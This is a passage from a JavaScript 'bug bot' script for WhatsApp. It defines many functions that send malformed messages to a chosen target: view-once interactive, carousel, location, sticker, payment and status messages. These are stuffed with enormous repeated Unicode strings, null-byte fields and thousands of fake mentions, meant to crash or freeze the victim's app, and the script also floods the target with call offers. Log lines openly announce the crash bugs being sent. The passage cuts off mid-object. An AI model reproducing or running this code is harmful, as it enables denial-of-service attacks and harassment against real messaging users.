          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: generateRandomMessageId(),
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  console.log(chalk.red("Dark Success Sending Bug"));
}

async function BlankDelay(sock, target) {
  try {
    
    if (!target.includes('@')) {
      target = target.includes('-') ? `${target}@g.us` : `${target}@s.whatsapp.net`;
    }

    
    const messageContent = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: { title: "GXION Is Hare" },
            body: { text: "Lixx Never Up?" },
            footer: { text: "ampas" },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    displayText: "Kunjungi situs",
                    url: "https://whatsapp.com"
                  })
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: JSON.stringify({
                    displayText: "Salin kode promo",
                    copyCode: "TRAZ2025"
                  })
                }
              ]
            }
          }
        }
      }
    }

    const msg = generateWAMessageFromContent(target, messageContent, {})
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id })

    console.log("Pesan terkirim ✅")
  } catch (err) {
    console.error("Terjadi kesalahan:", err)
  }
}

async function UiCrash(sock, target) {
  try {
    
    if (!target.includes('@')) {
      target = target.includes('-')
        ? `${target}@g.us`
        : `${target}@s.whatsapp.net`;
    }

    const message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              hasMediaAttachment: false,
              title: "".repeat(30),
            },
            body: {
              text: " " + "ꦽ".repeat(200),
            },
            footer: {
              text: "",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "review_and_pay",
                  buttonParamsJson: JSON.stringify({
                    order_title: "Special Order UI Test",
                    order_id: "RFZ" + Date.now(),
                    amount: "999999",
                    currency: "IDR",
                    description: "Faridz test structure review_and_pay",
                    merchant_name: "Faridz Labs",
                    payment_status: "pending",
                    review_note: "Massive payload length: " + "⚡".repeat(500),
                  }),
                },
              ],
            },
            contextInfo: {
              remoteJid: target,
              participant: target,
              stanzaId: sock.generateMessageTag(),
            },
          },
        },
      },
    };

    const msg = generateWAMessageFromContent(target, message, {});

    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });

    console.log("✅ Success: UI Crash message sent!");
  } catch (error) {
    console.log("❌ Error:\n" + error);
  }
}

async function CrashThenPaymentSingleTry(target) {
  try {
    await sock.relayMessage(target, {
      locationMessage: {
        degreesLatitude: 2.9990000000,
        degreesLongitude: -2.9990000000,
        name: "PERMEN" + "𑇂𑆵𑆴𑆿饝喛".repeat(80900),
        url: `https://` + `𑇂𑆵𑆴𑆿`.repeat(1817) + `.com`
      }
    }, {
      participant: {
        jid: target
      }
    });
    await sock.relayMessage(target, {
      paymentInviteMessage: {
        serviceType: "PAYMENT",
        expiryTimestamp: Math.floor(Math.random() * -20000000),
      },
    }, {
      participant: {
        jid: target,
      },
    });

  } catch (error) {
    console.error("Error di CrashThenPaymentSingleTry:", error);
  }
}

async function extrakuota(target) {
  let hell = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "idiot",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 0,
    isForwarded: false,
    font: Math.floor(Math.random() * 9),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
  });
  
  await sock.relayMessage("status@broadcast", hell.message, {
    messageId: hell.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  });

  await sock.relayMessage(target, {
    statusMentionMessage: {
      message: {
        protocolMessage: {
          key: hell.key,
          type: 25
        }
      }
    }
  },
  {
    additionalNodes: [{
      tag: "meta",
      attrs: { is_status_mention: "true" },
      content: undefined
    }]
  });
      
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined,
        }],
      }],
    }],
  });
  console.log(chalk.red('Send Bug dark Delay 🚀')) 
}

async function CardsCarousel(target) {
    try {
        const cards = Array.from({ length: 1000 }, () => ({
            body: proto.Message.InteractiveMessage.Body.fromObject({ text: "  Hi L :) " }),
            footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "ㅤHi L :)ㅤ" }),
            header: proto.Message.InteractiveMessage.Header.fromObject({
                title: 'Im So alone',
                hasMediaAttachment: true,
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
                    fileLength: "10840",
                    height: 10,
                    width: 10,
                    mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
                    fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
                    directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1721344123",
                    jpegThumbnail: ""
                }
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] })
        }));

        const death = Math.floor(Math.random() * 5000000) + "@s.whatsapp.net";

        const carousel = generateWAMessageFromContent(
            target, 
            {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                            body: proto.Message.InteractiveMessage.Body.create({ 
                                text: `You, You Disappointed Me \n${"𑜦".repeat(1000)}:)\n\u0000` 
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({ 
                                text: "`Iam Lixx" 
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({ 
                                hasMediaAttachment: false 
                            }),
                            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ 
                                cards: cards 
                            }),
                            contextInfo: {
                                mentionedJid: [
                                    target,
                                    "0@s.whatsapp.net",
                                    ...Array.from({ length: 1900 }, () => 
                                        `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)
                                ],
                                remoteJid: target,
                                participant: death,
                                stanzaId: "1234567890ABCDEF"
                            }
                        })
                    }
                }
            }, 
            { userJid: target }
        );

        await sock.relayMessage(target, carousel.message, {
            messageId: carousel.key.id,
            participant: { jid: target }
        });

        console.log(`Arigatou, mina :) `);
        return { status: "success", messageId: carousel.key.id };
        
    } catch (err) {
        console.error("Error sending carousel:", err);
        return { 
            status: "error", 
            error: err.message,
            stack: err.stack 
        };
    }
}

async function OfferPopup(sock, target) {
    try {
        await sock.offerCall(target);
        console.log(chalk.white.bold(`Success Send Offer To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer To Target:`, error));
    }
    try {
        await sock.offerCall(target, { video: true });
        console.log(chalk.red.bold(`Success Send Offer To Target`));
    } catch (error) {
        console.error(chalk.red.bold(`Failed Send Offer To Target:`, error));
    }
}

async function notificationblank(sock, target) {
  const message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            imageMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQNUlmFQCflj-o4DnkkqBD4dXmdF0J5mOAGHGmOBDv3xZmtq4W9LY8BC7da1MpgpEmzzIzkze6beOUhTs6pBnav3pOPMexEWn9LjoT3QOw?ccb=9-4&oh=01_Q5Aa2QGEGLzQfGw8rA0j77_p8R7jcCDlLi4V-gnHyyeOnFNAWQ&oe=68D151D5&_nc_sid=e6ed6c&mms3=true",
              directPath: "/o1/v/t24/f2/m269/AQNUlmFQCflj-o4DnkkqBD4dXmdF0J5mOAGHGmOBDv3xZmtq4W9LY8BC7da1MpgpEmzzIzkze6beOUhTs6pBnav3pOPMexEWn9LjoT3QOw?ccb=9-4&oh=01_Q5Aa2QGEGLzQfGw8rA0j77_p8R7jcCDlLi4V-gnHyyeOnFNAWQ&oe=68D151D5&_nc_sid=e6ed6c",
              mimetype: "image/jpeg",
              mediaKey: "2fXXmVelp53Ffz5tv7J0UJyEmUEoFbfpeGcgG21zKk4=",
              fileEncSha256: "I/6MTYL3oRDBI3dPez/v6V0Meq90dRerYyhWJF0PYDw=",
              fileSha256: "ExVmZkmvhmJRraU4undM/3Zcz80Ju46UkTWd2eRWMX8=",
              fileLength: "46031",
              mediaKeyTimestamp: "1755963474"
            }
          },
          body: {
            text: "halo makan permen yuk" + "ꦾ".repeat(30000), 
          },
          footer: {
            text: "p bang" + "ꦽ".repeat(10000), 
          },
          nativeFlowMessage: {
            messageParamsJson: ")}".repeat(5000), 
            buttons: [
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({ status: true }) 
              },
              { 
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) 
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) 
              },
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({ status: true }) 
              },
              { 
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) 
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) 
              },
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({ status: true }) 
              },
              { 
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) 
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) 
              }
            ],
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, proto.Message.fromObject(message), { userJid: target });

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });

}

async function CtaZts(sock, target) {
  const media = await prepareWAMessageMedia(
    { image: { url: "https://l.top4top.io/p_3552yqrjh1.jpg" } },
    { upload: sock.waUploadToServer }
  );

  const Interactive = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: "X",
            stanzaId: "123",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000,
              },
              forwardedAiBotMessageInfo: {
                botName: "META AI",
                botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                creatorName: "Bot",
              },
            },
          },
          carouselMessage: {
            messageVersion: 1,
            cards: [
              {
                header: {
                  hasMediaAttachment: true,
                  media: media.imageMessage,
                },
                body: {
                  text: " #Hallo Gasy. " + "ꦽ".repeat(100000),
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: "ꦽ".repeat(2000),
                    },
                  ],
                  messageParamsJson: "{".repeat(10000),
                },
              },
            ],
          },
        },
      },
    },
  };

  await sock.relayMessage(target, Interactive, {
    messageId: null,
    userJid: target,
  });
}

async function UIMention(sock, target, mention = true) {
  const qwerty = "https://files.catbox.moe/4x4hzu.jpg"
  const msg = generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { 
              text: "\n" + "\n" + "\u200B" + "ꦾ".repeat(10000) + "ꦽ".repeat(2500) + "ោ៝".repeat(2500)
            },
            nativeFlowMessage: {
              messageParamsJson: "{}".repeat(10000),
              buttons: [
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    flow_id: Date.now(),
                    flow_message_version: "9",
                    flow_token: Date.now(),
                    flow_action: "share",
                    flow_action_payload: {
                      screen: "GALLERY_SCREEN",
                      params: {
                        media_type: "image",
                        max_selection: 9999999
                      }
                    },
                    flow_cta: "x",
                    icon: qwerty,
                    updated_at: null,
                    experimental_flags: {
                      use_native_flow_v2: true,
                      enable_logging_context: true
                    }
                  })
                }
              ]
            },
            ...(mention ? { contextInfo: { mentionedJid: [target] } } : {})
          }
        }
      }
    }),
    {}
  );

  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

async function LolipopIos(sock, target, mention) {
const MYDelicious = "ANJAY" + "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
         url: `${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "MY WIFE" + MYDelicious,
            matchedText: "͜",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAA",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 64991,
            thumbnailWidth: 672740,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      console.log(chalk.red(`BUG DIKIRIM KE => ${target}`));
   } catch (err) {
      console.error(err);
   }
};

async function BlankUi(target) {
  const Bella = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            imageMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m233/AQObCXPc2AEH2totMBS4GZgFn_RPGdyZKyS2q0907ggtKlAnbqRetIpxhvzlPLeThlEgcDMBeDfdNqfTO8RFyYcfKvKFkBzvj0yos9sJKg?mms3=true",
              directPath: "/o1/v/t24/f2/m233/AQObCXPc2AEH2totMBS4GZgFn_RPGdyZKyS2q0907ggtKlAnbqRetIpxhvzlPLeThlEgcDMBeDfdNqfTO8RFyYcfKvKFkBzvj0yos9sJKg",
              mimetype: "image/jpeg",
              width: 99999999999999,
              height: 99999999999999,
              fileLength: 9999999999999,
              fileSha256: "1KOUrmLddsr6o9UL5rTte7SXgo/AFcsqSz3Go+noF20=",
              fileEncSha256: "3VSRuGlV95Aj9tHMQcUBgYR6Wherr1sT/FAAKbSUJ9Y=",
              mediaKeyTimestamp: 1753804634,
              mediaKey: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
            }
          },
          body: { 
            text: "permisi Paket atas nama..." + "ꦽ".repeat(50000),
          },
          contextInfo: {
        participant: target,
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 700 }, () =>
            "1" + Math.floor(Math.random() * 9999999) + "@s.whatsapp.net"
          )
        ]
      },
          nativeFlowMessage: {            
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({ status: true })
              },
              {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(50000)
                })
              },
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(50000)
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(50000)
                })
              }
            ],
            messageParamsJson: "{".repeat(10000)
          }
        }
      }
    }
  };

  await sock.relayMessage(target, Bella, {
    messageId: "",
    participant: { jid: target },
    userJid: target
  });
}

async function Mentiondelays(sock, target, mention = true) {
    for (let i = 0; i < 1; i++) {

        let msg = generateWAMessageFromContent(
            target,
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            contextInfo: {
                                remoteJid: " X ",
                                StatusAttributionType: "FORWARDED_FROM_STATUS",
                                StatusAudienceMetadata: "CLOSE_FRIENDS",
                                StatusSourceType: "TEXT",
                                mentions: Array.from(
                                    { length: 150 },
                                    () =>
                                        "1" +
                                        Math.floor(Math.random() * 5000000) +
                                        "@.s.whatsapp.net"
                                ),
                                isForwarded: true,
                                fromMe: false,
                                forwardingScore: 9999,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: "120363422445860082@newsletter",
                                    serverMessageId: 1,
                                    newsletterName: "--FuckYouuu"
                                }
                            },
                            body: {
                                text: "#FuxkYourBrother🩸",
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: "call_permission_request",
                                paramsJson: "\u0000".repeat(1000000),
                                version: 3
                            }
                        }
                    }
                }
            },
            {
                ephemeralExpiration: 0,
                forwardingScore: 9741,
                isForwarded: true,
                font: Math.floor(Math.random() * 99999999),
                background:
                    "#" +
                    Math.floor(Math.random() * 16777215)
                        .toString(16)
                        .padStart(6, "999999")
            }
        );

        let etc = generateWAMessageFromContent(
            target,
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            contextInfo: {
                                remoteJid: " X ",
                                StatusAttributionType: "FORWARDED_FROM_STATUS",
                                StatusAudienceMetadata: "CLOSE_FRIENDS",
                                StatusSourceType: "TEXT",
                                mentions: Array.from(
                                    { length: 150 },
                                    () =>
                                        "1" +
                                        Math.floor(Math.random() * 5000000) +
                                        "@.s.whatsapp.net"
                                ),
                                isForwarded: true,
                                fromMe: false,
                                forwardingScore: 9999,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: "120363422445860082@newsletter",
                                    serverMessageId: 1,
                                    newsletterName: "►FakerrrWhats"
                                }
                            },
                            body: {
                                text: "Keep forward",
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: "address_message",
                                paramsJson: `{\"values\":{\"in_pin_code\":\"7205\",\"building_name\":\"russian motel\",\"address\":\"2.7205\",\"tower_target\":\"507\",\"city\":\"Batavia\",\"name\":\"Otax?\",\"phone_target\":\"+13135550202\",\"house_target\":\"7205826\",\"floor_target\":\"16\",\"state\":\"${"\x10".repeat(
                                    1000000
                                )}\"}}`,
                                version: 3
                            }
                        }
                    }
                }
            },
            {
                ephemeralExpiration: 0,
                forwardingScore: 9741,
                isForwarded: true,
                font: Math.floor(Math.random() * 99999999),
                background:
                    "#" +
                    Math.floor(Math.random() * 16777215)
                        .toString(16)
                        .padStart(6, "999999")
            }
        );

        let xwar = generateWAMessageFromContent(
            target,
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            contextInfo: {
                                remoteJid: " X ",
                                StatusAttributionType: "FORWARDED_FROM_STATUS",
                                StatusAudienceMetadata: "CLOSE_FRIENDS",
                                StatusSourceType: "TEXT",
                                mentions: Array.from(
                                    { length: 150 },
                                    () =>
                                        "1" +
                                        Math.floor(Math.random() * 5000000) +
                                        "@.s.whatsapp.net"
                                ),
                                isForwarded: true,
                                fromMe: false,
                                forwardingScore: 9999,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: "120363422445860082@newsletter",
                                    serverMessageId: 1,
                                    newsletterName: "┃FakerrBrother"
                                }
                            },
                            body: {
                                text: "@xwarrxxx • #Is Here",
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: "call_permission_message",
                                paramsJson: "\x10".repeat(1000000),
                                version: 2
                            }
                        }
                    }
                }
            },
            {
                ephemeralExpiration: 0,
                forwardingScore: 9741,
                isForwarded: true,
                font: Math.floor(Math.random() * 99999999),
                background:
                    "#" +
                    Math.floor(Math.random() * 16777215)
                        .toString(16)
                        .padStart(6, "999999")
            }
        );

        await sock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: msg.message
                }
            },
            mention
                ? { messageId: msg.key.id, participant: { jid: target } }
                : { messageId: msg.key.id }
        );

        await sock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: etc.message
                }
            },
            mention
                ? { messageId: etc.key.id, participant: { jid: target } }
                : { messageId: etc.key.id }
        );

        await sock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: xwar.message
                }
            },
            mention
                ? { messageId: xwar.key.id, participant: { jid: target } }
                : { messageId: xwar.key.id }
        );
    }
}

async function amountOne(target) {
  const Null = {
    requestPaymentMessage: {
      amount: {
       value: 1,
       offset: 0,
       currencyCodeIso4217: "IDR",
       requestFrom: target,
       expiryTimestamp: Date.now()
      },
      contextInfo: {
        externalAdReply: {
          title: null,
          body: "X".repeat(1500),
          mimetype: "audio/mpeg",
          caption: "X".repeat(1500),
          showAdAttribution: true,
          sourceUrl: null,
          thumbnailUrl: null
        }
      }
    }
  };
    
    let Payment = {
    interactiveMessage: {
      header: {
        title: "Null",
        subtitle: "ꦾ".repeat(10000),
        hasMediaAttachment: false
      },
      body: {
        text: "ꦾ".repeat(20000)
      },
      footer: {
        text: "ꦾ".repeat(20000)
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "ꦾ".repeat(20000),
              sections: [
                {
                  title: "ꦾ".repeat(5000),
                  rows: [
                    { 
                      title: "ꦾ".repeat(5000), 
                      description: "ꦾ".repeat(5000), 
                      id: "ꦾ".repeat(2000) 
                    },
                    { 
                      title: "ꦾ".repeat(5000), 
                      description: "ꦾ".repeat(5000), 
                      id: "ꦾ".repeat(2000) 
                    },
                    { 
                      title: "ꦾ".repeat(5000), 
                      description: "ꦾ".repeat(5000), 
                      id: "ꦾ".repeat(2000) 
                    }
                  ]
                },
                {
                  title: "ꦾ".repeat(20000) + "bokep simulator",
                  rows: [
                    { 
                      title: "ꦾ".repeat(5000), 
                      description: "ꦾ".repeat(5000), 
                      id: "ꦾ".repeat(2000) 
                    },
                    { 
                      title: "Null", 
                      description: "\u0000".repeat(5000), 
                      id: "ꦾ".repeat(2000) 
                    }
                  ]
                }
              ]
            })
          }
        ]
      }
    }
  };
  
  
  await sock.relayMessage(target, Null, Payment, {
    participant: { jid: target },
    messageId: null,
    userJid: target,
    quoted: null
  });
}

async function blankontolz(sock, target) {
 const msg1 = proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            locationMessage: {
              degreesLatitude: 11.11,
              degreesLongitude: -11.11,
              name: "KILL YOU BABY" + "ꦽ".repeat(60000),
              url: "https://t.me/Xwarrxxx",
              contextInfo: {
                externalAdReply: {
                  quotedAd: {
                    advertiserName: "ꦾ".repeat(60000),
                    mediaType: "IMAGE",
                    jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/", "base64"),
                    caption: "KILLER YOU"
                  },
                  placeholderKey: {
                    remoteJid: "0@g.us",
                    fromMe: true,
                    id: "ABCDEF1234567890"
                  }
                }
              }
            },
            hasMediaAttachment: true
          },
          body: {
            text: "MISI BANG"
          },
          nativeFlowMessage: {
            messageParamsJson: "{[",
            messageVersion: 3,
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: ""
              },
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "RIVIEW",
                  flow_cta: "ꦽ".repeat(10000),
                  flow_message_version: "3"
                })
              },
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "RIVIEW",
                  flow_cta: "ꦾ".repeat(10000),
                  flow_message_version: "3"
                })
              }
            ]
          },
          quotedMessage: {
            interactiveResponseMessage: {
              nativeFlowResponseMessage: {
                version: 3,
                name: "call_permission_request",
                paramsJson: "\u0000".repeat(1045000)
              },
              body: {
                text: "ANDROID KILLER",
                format: "DEFAULT"
              }
            }
          }
        }
      }
    }
  });

  const msg = await generateWAMessageFromContent(target, msg1, { userJid: target });
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
  
 const msg2 = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                            fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
                            fileLength: "999999999999",
                            pageCount: 1316134911,
                            fileLength: 9999999999,
                            height: 999999999,
                            mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
                            fileName: "NT BRO" + "ꦾ".repeat(60000),
                            fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
